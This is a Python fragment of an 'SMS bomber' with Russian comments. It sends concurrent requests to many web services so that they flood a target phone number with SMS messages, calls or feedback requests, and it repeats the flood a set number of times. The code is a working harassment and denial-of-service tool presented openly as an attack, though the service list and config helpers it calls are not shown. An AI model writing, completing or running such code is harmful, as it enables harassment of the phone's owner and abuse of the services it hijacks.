async def request(session, url):
    try:
        print("Starting request...")  # Отладочное сообщение перед выполнением запроса
        type_attack = ('SMS', 'CALL', 'FEEDBACK') if check_config()['type_attack'] == 'MIX' else check_config()['type_attack']

        if url['info']['attack'] in type_attack:
            async with session.request(
                url['method'], url['url'], 
                params=url.get('params'), cookies=url.get('cookies'), 
                headers=url.get('headers'), data=url.get('data'), 
                json=url.get('json'), timeout=10
            ) as response:
                print("Received response...")  # Отладочное сообщение после получения ответа

                if response.status == 200:
                    domain = urlparse(url['url']).netloc
                    print(Fore.GREEN + "Успешно: " + Fore.CYAN + f"{domain}")
                return await response.text()
    except TimeoutError:
        domain = urlparse(url['url']).netloc
        print(Fore.RED + f"Таймаут: " + Fore.CYAN + f"{domain}")
    except Exception as e:
        domain = urlparse(url['url']).netloc
        print(Fore.RED + f"Ошибка: " + Fore.CYAN + f"{domain}")
        print(f"Exception: {e}")  # Отладочное сообщение для исключения

async def async_attacks(number):
    print("Starting async_attacks...")  # Отладочное сообщение перед началом атаки
    async with ClientSession() as session:
        services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
        tasks = [ensure_future(request(session, service)) for service in services]
        await gather(*tasks)
    print("Finished async_attacks...")  # Отладочное сообщение после завершения атаки

def start_async_attacks(number, replay):
    '''Запуск бомбера'''
    print(f"Starting start_async_attacks with replay: {replay}")  # Отладочное сообщение перед началом атак
    for _ in range(int(replay)):
        run(async_attacks(number))
    print("Finished start_async_attacks...")  # Отладочное сообщение после завершения атак
